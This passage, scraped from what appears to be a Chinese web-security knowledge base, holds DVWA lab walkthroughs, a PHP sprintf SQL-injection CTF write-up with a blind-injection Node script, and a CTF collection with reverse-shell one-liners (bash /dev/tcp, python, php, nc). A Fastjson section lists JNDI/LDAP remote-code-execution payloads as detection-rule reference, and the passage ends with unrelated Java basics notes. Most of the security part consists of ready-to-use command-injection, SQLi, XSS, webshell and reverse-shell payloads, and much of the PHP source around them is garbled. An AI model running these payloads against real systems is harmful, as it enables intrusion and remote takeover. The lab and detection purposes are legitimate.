= shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"{$cmd}\"; } ?> 查看源码，这里将&&和; 做了过滤，当出现&&和;将会被代替为空格，使其不能命令执行，很明显这是黑名单策略，只要绕过黑名单就可以了 在windows中，&&和&,||都可以执行多条命令 参数 描述 && Command 1&&Command 2，先执行Command1 执行成功后再执行Command 2，否则不执行 & Command 1&Command 2，先执行Command 1，不管是否成功，都会执行Command 2 \\ \\ Command 1 \\ \\ Command 2，当Command1 执行失败才会执行Command2，否则只执行Command1 在linux中，&&,;,|| 可以执行多条命令 参数 描述 && Command 1&&Command 2，先执行Command1 执行成功后再执行Command 2，否则不执行 ; Command 1&Command 2，先执行Command 1，不管是否成功，都会执行Command 2 \\ \\ Command 1 \\ \\ Command 2，当Command1 执行失败才会执行Command2，否则只执行Command1 由于搭建的环境是linux，&&，;都已经被过滤掉了，所以采用|| 第一个参数ip可以乱写一个ip，如127.0之类的，然后再添加响相应的命令执行 payload: 127.0 || whoami CSRF ' . mysql_error() . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } } else { // Didn't come from a trusted source echo \"That request didn't look correct.\"; } mysql_close(); } ?> 相关函数说明 int eregi(string pattern, string string) 检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。 可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.124.130），希望通过这种机制抵御CSRF攻击 漏洞利用 过滤规则是http包头的Referer参数的值中必须包含主机名 那么可以将文件命名为受害者的ip.html 放在攻击者服务器中，诱导受害者点击,则可以成功修改密码 File Inclusion 可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\\”替换为空字符，即删除。 漏洞利用 使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。 str_replace函数会将http://删除，于是双写`hthttp://tp://`，成功执行远程命令。 同时，因为替换的只是“../”、“..\\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。 File upload Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } ?> 对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。 方法一：组合拳 可以上传图片马，然后使用文件包含漏洞去访问图片，文件包含访问图片会将图片按PHP解析 上传图片马（size 在文件包含模块中访问该文件 直接上蚁剑,在这里注意，访问文件包含模块中必须要在登录状态中，所以在HTTP头中添加Cookie，然后再连接 方法二：通过burp修改Content-Type 为image/png 发现文件上传成功，上蚁剑 SQL Injection ' . mysql_error() . '' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } //mysql_close(); } ?> mysql_real_escape_string函数对特殊符号 \\x00,\\n,\\r,\\,’,”,\\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入 但是在注入点，id 为int型，当爆列名时需要加单引号，可以将其转换为十六进制 根据爆列名的特殊情况的payload payload: -1 union select 1,group_concat(column_name) from information_schema.columns where table_name = 0x7573657273 SQL Injection (Blind) 0 ) { // Feedback for end user echo 'User ID exists in the database.'; } else { // Feedback for end user echo 'User ID is MISSING from the database.'; } //mysql_close(); } ?> 整形注入，布尔盲注，以及时间注入，类似于low级别，使用burp抓包改包 XSS（ Reflected） ', '', $_GET[ 'name' ] ); // Feedback for end user echo \"Hello ${name}\"; } ?> 可以看到将参数中的替换成空字符串，可以使用双写绕过,或者大小写编码 payload： ipt>alert('xss') payload: alert('xss') XSS（Stored） ', '', $name ); $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '' . mysql_error() . '' ); //mysql_close(); } ?> strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用标签。 addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了字符串，仍然存在存储型的XSS。 name 参数中转换为空格，虽然在前端做了处理，不能超过规定字符，那么通过抓包改包，双写来实现xss,或者大小写实现xss payload: POST /vulnerabilities/xss_s/ HTTP/1.1 Host: 192.168.124.130 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 53 Connection: close Referer: http://192.168.124.130/vulnerabilities/xss_s/ Cookie: PHPSESSID=covp1pifd04hv2he3f5lfl1875; security=medium Upgrade-Insecure-Requests: 1 txtName=ript>alert('aaron')&mtxMessage=test&btnSign=Sign+Guestbook High BRUTE Force（爆库） ' . mysql_error() . '' ); if( $result && mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, \"avatar\" ); // Login successful echo \"Welcome to the password protected area {$user}\"; echo \"\"; } else { // Login failed sleep( rand( 0, 3 ) ); echo \"Username and/or password incorrect.\"; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?> High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token 每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询 同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。 由于加入了Anti-CSRFtoken预防无脑爆破，这里就不推荐用Burpsuite了 Command Injection '', ';' => '', '| ' => '', '-' => '', '$' => '', '(' => '', ')' => '', '`' => '', '||' => '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"{$cmd}\"; } ?> 黑名单策略，观察|是|+空格被转换为空字符串，所以可以使用空格+|+命令来实现命令执行 payload : 127.0.0.1 |whoami payload : 127.0.0.1|whoami CSRF ' . mysql_error() . '' ); // Feedback for the user echo \"Password Changed.\"; } else { // Issue with passwords matching echo \"Passwords did not match.\"; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?> 这里对CSRF进行了限制，使用了token技术，验证前端传去的token是否与服务端发送给前端的token是否一致，从而限制了CSRF 组合拳，构造攻击页面，使用xss拿到token，可以构造CSRF攻击 File Inclusion 可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 漏洞利用 file协议，只要知道绝对路径，就可以包含本地文件 payload: file:///var/www/html/hackable/uploads/1.jpg upload Your image was not uploaded.'; } else { // Yes! echo \"{$target_path} succesfully uploaded!\"; } } else { // Invalid file echo 'Your image was not uploaded. We can only accept JPEG or PNG images.'; } } ?> strrpos(string,find,start) 函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。 getimagesize(string filename) 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型 组合拳： 利用文件包含漏洞，上传图片马，中国蚁剑直接连接 制作图片马 copy 1.jpg/b + 1.php/a hack.jpg 上传hack.jpg之后，在文件包含处使用读取文件，并解析成php代码，中国蚁剑直接连接 SQL Injection Something went wrong.' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i ID: {$id}First name: {$first}Surname: {$last}\"; // Increase loop count $i++; } mysql_close(); } ?> 这里存在字符型注入，并且当sql语句执行错误，则会永久重定向到错误页面，但是这里的参数id没有做任何处理，那么则可以使用联合注入，并回显到当前页面 payload : -1' union select 1,2# SQL Injection (Blind) 0 ) { // Feedback for end user echo 'User ID exists in the database.'; } else { // Might sleep a random amount if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } // User wasn't found, so the page wasn't! header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); // Feedback for end user echo 'User ID is MISSING from the database.'; } mysql_close(); } ?> 这里也是同样的为字符型注入，id参数未做任何转义处理，直接写入sql查询 payload: 1' and ascii(substr(database(),1,1)) XSS（ Reflected） Hello ${name}\"; } ?> 这里函数用正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效绕过了标签，虽然无法使用标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码 payload : XSS（Stored） ' . mysql_error() . '' ); //mysql_close(); } ?> 同反射型xss一致，在name处可以使用img标签注入xss代码,不过在前端name处设置了最大字符长度，所以使用burp抓包注入xss代码 payload: Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:10:05 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/12.DVWA通关记录.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/13.PHP_SPRINTF格式化字符串漏洞.html":{"url":"知识库/01.WEB安全/11.其他/13.PHP_SPRINTF格式化字符串漏洞.html","title":"13.PHP_SPRINTF格式化字符串漏洞","keywords":"","body":" sprintf() 函数 定义和用法 例子 SQL 题目：“迎圣诞，拿大奖”活动赛题 PHP SPRINTF格式化字符串漏洞 sprintf() 函数 w3school 定义和用法 sprintf() 函数把格式化的字符串写入变量中 sprintf(format,arg1,arg2,arg3) arg1、arg2、arg++ 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。 注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 \\$组成 例子 1 使用格式 2 使用占位符 不带小数：%1\\$u\",$number); echo $txt; // 带有两位小数：123.00 // 不带小数：123 ?> 由于占位符位于 % 符号之后，由数字和 \\$组成，如果%后面出现一个\\，那么PHP会把\\当做一个格式化字符的类型而吃掉\\，最后%\\(或者%1$\\)都会被置空，其实就是%后的一个字符(除了%)都会被当作字符型类型而被吃掉，也就是被当做一个类型进行匹配后面的变量，比如%c就匹配ASCII，%d匹配整形 如下图所示，在浏览器上运行此php代码，当占位符写成%1$\\那么%1$\\会被置空，则.2f会变成普通的字符输出 那么通过这个漏洞主要是能够构造语句闭合单引号，以达到SQL注入的目的 SQL 运行结果为 select * from user where username='admin' or 1=1#' and password = '123456' 此时，%1$\\被置空，剩下' or 1=1 # 闭合admin前面的单引号#后面的则被注释，在登录的时候，就是一个万能密码，可以直接登入系统 题目：“迎圣诞，拿大奖”活动赛题 看到登录框先试一试弱口令，测试得知用户名为admin，对username 和 password 开始注入，耗费大量时间，未找到注入点，查阅相关资料，以为有waf，则使用burp跑了一遍waf字典，发现%会出现waring，具体结果如下所示 发现存在sprintf漏洞，于是查阅相关资料 构造username=admin%1$\\' or 1=1# 和 admin%1$\\' or 1=2# 可以发现当1=1时，页面回显password error! ，当1=2时页面回显username error!，所以存在布尔注入 此时由开始写过得SQL-LABS GET型布尔盲注脚本(node)重新修改一下代码如下 const axios = require('axios') const querystring = require('querystring') const readline = require('readline') const rl = readline.createInterface({ input: process.stdin, output: process.stdout }) async function inject(params) { console.log('[+]payload: ' + params.username) let response = await axios({ url: 'http://3aa979dedd07412abfde94cebeb093bddbd33708a0be4aa4.changame.ichunqiu.com/', method: 'post', data: querystring.stringify(params), headrs: { 'Content-type': 'application/x-www-form-urlencoded' } }) const regex = /password error!/ if (regex.test(response.data)) { return parseInt(params.username.match(/\\&\\d+/)[0].replace(/\\D+/, '')) } else { return 0 } } async function main() { const sql = await new Promise((resolve, reject) => { rl.on('line', sql => { resolve(sql) rl.close() }) }) let flag = true let index = 1 let str = '' let params = { username: '', password: 'admin' } while (flag) { let sum = 0 for (let i = 0; i 运行结果 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:48:45 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/13.PHP_SPRINTF格式化字符串漏洞.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/14.CTF题目收集.html":{"url":"知识库/01.WEB安全/11.其他/14.CTF题目收集.html","title":"14.CTF题目收集","keywords":"","body":" bash 反弹 python 一句话反弹 php 一句话反弹 NC命令反弹 exec 反弹 文件重定向 文件包含 相对路径包含文件 绝对路径包含文件 垂直越权 代码审计 MD5 截断比较验证 命令执行 无题目描述，拿到此题时，猜想是命令执行，当输入ipconfig,ifconfig命令的时候，给的提示是get out Hacker,按照input框说的给出ip,输入ping 127.0.0.1，发现结果变了如下图 发现命令是能跑起来，并且没有错误，同时使用burp跑了一下后台目录，发现有flag.php文件，但是访问/flag.php并没有回显，但是状态码是200，则证明是一个php的脚本，没有任何html相关的代码 在命令执行部分，只能访问ip才会被探测到，那么可以使用;,&&,||等执行第二条命令 构造payload ping 1.1.1.1;ifconfig 发现回显get out hacker,猜想是有过滤，只保留一个关键字，将ping这个关键字去掉，发现没有被拦截，出现以下字符 那么猜想肯定是命令肯定是执行了的，因为服务器环境是linux，可以使用ping 127.0.0.1来查看是否执行了命令，因为在linux中如果不中止该命令，则会一直ping -e 1.1.1.1;ping 127.0.0.1 说明一直在执行ping命令，那么服务器既然能成功执行;后面的命令，那么可以在vps上反弹shell bash 反弹 bash -i >& /dev/tcp// 0>&1 python 一句话反弹 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' php 一句话反弹 php -r '$sock=fsockopen(\"\",);exec(\"/bin/sh -i &3 2>&3\");' NC命令反弹 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc >/tmp/f exec 反弹 0/dev/tcp//; sh &196 2>&196 因为此页面是php搭建的，所以使用php 一句话反弹shell，在vps上监听5000端口，在web页面执行php一句话反弹shell,如下图 经过试验，服务端没有python环境，能反弹shell回来的只有php一句话 反弹，nc命令反弹 文件重定向 已知存在flag.php,可以将flag.php里的内容重定向到当前目录的*.txt文件中 cat flag.php > 1.txt 然后访问该1.txt就能看见flag.php里的内容 文件包含 打开F12查看script的src引入文件的方式并不是直接引入文件，而是使用download.php?f=的方式包含文件来引入文件，所以直接访问该接口包含文件 相对路径包含文件 绝对路径包含文件 flag文件在根目录下，并且代码中对../做了replace所以采用双写绕过，很可惜没有该服务器未开启远程文件包含，所以能做的事太少了 垂直越权 一般控制用户的权限都在后台，后台一般是放在cookie里或者发送隐藏的JWT到前台，以做到控制权限 创建一个普通用户admin'#，尝试二次注入攻击，猜想在修改密码处执行的sql语句是 update users set password = '' where username = '' 二次注入攻击会将admin用户的密码修改了，执行的sql语句是 update users set password = '123456' where username = 'admin'#' #直接将单引号注释，达到闭合前面的'，尝试之后，发现修改的是admin'#的密码 查看是否可以垂直越权，抓包发现cookie处的PHPLOG很可疑，末尾要么是7，或者是77，和base64编码的=,==很类似，猜想是将username进行base64编码之后，再加上'='——'7'的偏移量-6 base64编码中只存在 A-Z、a-z、0-9、+、/ 、=ASCII字符，对其进行从小到大的排列，将admin进行编码，再加上偏移量，加上偏移量如果不在base64编码中，则在A-Z，a-z，0-9循环，如4加上偏移量不是base64编码，当/结束之后，则循环再从z开始 修改之后则发现，修改密码成功，最后登入系统，拿到flag 代码审计 MD5 截断比较验证 \\n\"; die($content); } $m=md5($_REQUEST['password']); if(strtolower(substr($m,0,6))==='aaaaaa'){ echo $flag; }else{ echo \"what's the fuck?\"; } ?> 将参数password进行MD5，hash，得到一串hash值，并从0位置截取6位字符（strtolower函数将字符转换为小写）为'aaaaaa',如果相等则输出flag 直接上python脚本 import hashlib dict = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' def md5(text): return hashlib.md5(str(text).encode('utf-8')).hexdigest() for i in dict: for j in dict: for k in dict: for l in dict: for o in dict: x = i + j + k + l + o md5Code = md5(x) if md5Code[:6] == 'aaaaaa': print x else: continue Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:16:48 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/14.CTF题目收集.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/11.其他/15.Fastjson检测规则梳理.html":{"url":"知识库/01.WEB安全/11.其他/15.Fastjson检测规则梳理.html","title":"15.Fastjson检测规则梳理","keywords":"","body":" Fastjson漏洞的利用代码 HadoopHikari RCE（ Shiro RCE（ JndiConverter RCE（ IbatisSqlmap RCE（ CocoonSlide RCE（ Anteros RCE（ CommonsProxy RCE（ HikariConfig RCE（ JdbcRowSetImpl RCE（ 1.2.47以下版本漏洞利用代码 参考链接 Fastjson漏洞利用代码分析（检测规则参考） 截止2020年8月21日，根据公开信息，Fastjson 以下是fastjson漏洞的利用代码，可作为参考，进行检测规则的升级 Fastjson漏洞的利用代码 以下漏洞利用代码可用于探测后端是否使用了fastjson，是攻击者打点入侵的前兆，建议做【检测】处理（其中：dnslog往往是外部的域名或链接），每一行的json都是一个可能有效的payload {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"dnslog\"}}\"\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:\"aaa\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0 以下漏洞利用代码被服务端成功解析后，会导致远程命令执行，危害极大，建议做【封禁】处理。 注意：下文中，RCE代表Remote Code Execution（远程代码执行） HadoopHikari RCE（ fastjson org.apache.hadoop hadoop-client-minicluster 3.2.1 漏洞利用代码 {\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://[evil]/Calc\"} 或 {\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://[evil]/1pndqv\"} Shiro RCE（ fastjson 依赖shiro-core，即 org.apache.shiro shiro-core 漏洞利用代码 {\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:43658/Calc\"], \"Realms\":[\"\"]} JndiConverter RCE（ fastjson 版本小于 org.apache.xbean xbean-reflect 漏洞利用代码 {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"} IbatisSqlmap RCE（ fastjson org.apache.ibatis ibatis-sqlmap 2.3.4.726 javax javaee-api 8.0.1 漏洞利用代码 {\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:43658/Calc\"}} CocoonSlide RCE（ fastjson slide slide-kernel 2.1 cocoon cocoon-slide 2.1.11 漏洞利用代码 {\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://127.0.0.1:43658/Calc\"}, \"namespace\":\"\"} Anteros RCE（ fastjson com.codahale.metrics metrics-healthchecks 3.0.2 br.com.anteros Anteros-Core 1.2.1 br.com.anteros Anteros-DBCP 1.0.1 漏洞利用代码 {\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"} CommonsProxy RCE（ CommonsProxy fastjson org.apache.commons commons-proxy 漏洞利用代码 {\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:43658/Calc\",\"Object\":\"a\"} HikariConfig RCE（ fastjson com.zaxxer HikariCP 漏洞利用代码 {\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"} 或 {\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"} JdbcRowSetImpl RCE（ fastjson 1.2.48 以下不需要任何配置或依赖，默认配置通杀 RCE 漏洞利用代码 [{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658/Calc\",\"autoCommit\":true}] 1.2.47以下版本漏洞利用代码 版本 Payload 1.2.24 {\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}} 未知版本(1.2.24-41之间) {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.41 {\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true} 1.2.42 {\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}; 1.2.43 {\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true]} 1.2.45 {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}} 1.2.47 {\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}} 参考链接 [Fastjson 漏洞利用][http://dream0x01.com/spear-framework/#/fastjson/fastjson?id=%e4%be%9d%e8%b5%96-6] 官方通告链接 security_update_20200601-安全公告20200601 update_faq_20190722-FASTJSON升级常见问题解答 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-02 22:43:31 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/11.其他/15.Fastjson检测规则梳理.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/01.Java_JVM内存模型/":{"url":"知识库/02.JAVA安全/01.Java_JVM内存模型/","title":"01.Java_JVM内存模型","keywords":"","body":" JVM GC（Garbage Collection）垃圾回收器 JVM JVM 内存划分：它是人为的根据不同的内存空间的存储特点以及存储数据（逻辑划分） 程序计数器：当前线程所执行的字节码的行号指示器 本地方法栈：为虚拟机使用native方法服务 Java虚拟机栈：描述Java方法执行的内存模型，每个方法被执行的时候都会同时创建一个栈帧用于存储该方法的局部变量表、操作栈、动态链接、方法出口等信息（每一个方法创建一个栈帧，栈帧存放了当前方法的数据信息（局部变量），当方法调用完毕，该方法的栈帧就被销毁了） Java 堆：被所有线程共享的一块内存区域，在虚拟机启动时被创建。所有的对象实例以及数组都要在堆上分配（当使用new 关键字，就表示在堆中开辟一块新的存储空间） 方法区：线程共享的内存区域，存储已被虚拟机加载的类信息，常量、静态变量即时编译器编译后的代码数据等（这个区域的内存回收目标主要是针对常量的回收和对类型 的卸载） GC（Garbage Collection）垃圾回收器 Java的自动垃圾回收机制，简单理解为，程序员就不需要再手动的去控制内存的释放，当JVM发觉内存资源紧张的时候，就会自动地去清理无用对象（没有被引用的对象） Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:48:52 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/01.Java_JVM内存模型/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/02.Java_面向对象/":{"url":"知识库/02.JAVA安全/02.Java_面向对象/","title":"02.Java_面向对象","keywords":"","body":" 简介 面向过程 面向过程的设计 面向过程的设计缺陷 面向对象 面向对象的优势与特点 类和对象 理解什么是抽象 对象和类的关系 对象 类 如何定义一个类 对象的创建和条用方法以及操作字段 对象实例化的过程 对象的打印、比较、生命周期 打印 比较 生命周期 匿名对象：匿名/佚名 构造器 构造器的作用 构造器的特点 编译器创建的默认构造器特点 自定义构造器与构造器重载 自定义构造器 构造器重载 static 修饰符 static 成员在JVM中的存储 类成员与实例成员 简介 面向过程 该思想是站在过程的角度思考问题，强调的是功能行为，功能的执行过程，先干什么，后干什么，而每一个功能，都是用函数（类似于方法）把这些步骤一步一步实现，使用的时候依次调用函数 面向过程的设计 最小的程序单元就是函数，每个函数负责完成某一个功能，用于接收输入数据，函数堆输入数据进行处理，然后输出结果数据 整个软件系统由一个个的函数组成，其中作为程序入口的函数称之为主函数，主函数依次调用其他函数，普通函数之间可以相互调用，从而实现整个系统功能 面向过程的设计缺陷 面向过程的设计，是采用了置顶而下的设计方式，再设计阶段就需要考虑每一个模块应该分解成哪些子模块，每个子模块有细分更小的子模块，如此类推，知道将模块细化成一个个函数 存在的问题： 设计不够直观，与人类思维习惯不一致（谁来吃饭，而不是吃饭谁来参与） 系统软件适应性差，可拓展性差，维护性低 面向过程最大的问题在于随着系统的膨胀，面向过程将无法应付，最终导致系统的崩溃。为了解决这一种软件危机，提出了面向对象的思想 面向对象 一种基于面向过程的新的编程思想，顾名思义该思想是站在对象的角度思考问题，我们把多个功能合理放到不同对象里，强调的是具备某些功能的对象，而具备某种功能的实体，称之为对象。 面向对象的最小程序单元是：类 面向对象的优势与特点 更加符合我们常规的思维方式，稳定性好，可重用性强，易于开发大型软件产品，有良好的可维护性，在软件工程中，面向对象可以使工程更加模块化，实现更低的耦合和更高的内聚，面向对象的三大特征如下： 封装 继承 多态 封装：指将对象的实现细节隐藏起来，然后通过公共的方法向外暴露该对象的功能 继承：面向对象实现软件复用的重要手段，当子类继承父类后，子类是一种特殊的父类，能直接或间接获得父类里的成员 多态：可以直接把子类对象赋值给父类变量，但是运行时依然表现出子类的行为特征，这意味着同一类型的对象在运行时可能表现出不同的行为特征 类和对象 面向对象的三大特征 封装 继承 多态 理解什么是抽象 从特定的角度出发，从已经存在的一些事物中抽取我们所关注的特性、行为、从而形成一个新的十五的思维过程，是一种复杂到简单的思维方式 对象和类的关系 对象可以定义为包含状态和行为的一个实体，对象（object）也称为实例（Instance） 实体：存在于现实世界中并且可以与其他物体区分开的物体，表示实际存在的个体 对象 人们要进行研究的任何事物，一切事物都可以认为是对象 对象具有状态和行为 状态：比如姓名，年龄，性别等 行为：比如吃饭，睡觉，写代码等 通过多个同类型的对象分析，我们可以把对象抽象成类 类 具有相同特性（状态）和行为（功能）的对象抽象就是类。因此，对象的抽象是类，类的具体化就是对象，也可以说类的实例就是对象，类实际上就是一种数据类型 特性：对象的状态，用成员变量来描述 功能：对象的行为，用方法来描述 类是对象的类型/模板；创建一个对象就是使用一个类作为构建该对象的基础，实际上解释类和对象的关系确实存在着“先有蛋还是先有鸡”的问题，描述类扫不了对象，相反，描述对象也少不了类。对象是类的实例，类是对象的模板 如何定义一个类 [修饰符] class 类名{ 0 ~ N 个成员变量(字段/Field) 不要叫属性(JavaBean 中特殊的一种成员); 0 ~ N 个方法 } 定义类的注意事项： 如果类使用了public修饰符，必须保证当前文件名和当前类名相同 类名使用名称表示，类表示某一类事物，首字母大写，如果是多个的单词组成使用驼峰表示法，如EmployeeAdvanceSetting 在面向对象的过程中，定义类的时候，专门为描述对象提供一个类，该类不需要main方法对象的创建和条用方法以及操作字段 ``` 根据类来创建对象的语法 a. 类名 变量 = new 类名(); 给字段设置值 a. 对象变量.字段名称 = 该类型的值; 获取对象的值 a. 该字段类型对象变量 变量 = 对象变量.字段值 通过对象调用方法 a. 对象变量.方法(实参) java // Person 类 package com.study.Object; public class Person { public String userName; public int age; public int weight; public void sign() { System.out.println(this.userName + \" is sign~\"); } public void dance() { System.out.println(this.userName + \" is dance~\"); } } ```java // main 函数 package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); aaron.userName = \"aaron\"; aaron.age = 24; joe.userName = \"joe\"; joe.age = 23; System.out.println(aaron.userName); System.out.println(joe.age); } } aaron 23 对象实例化的过程 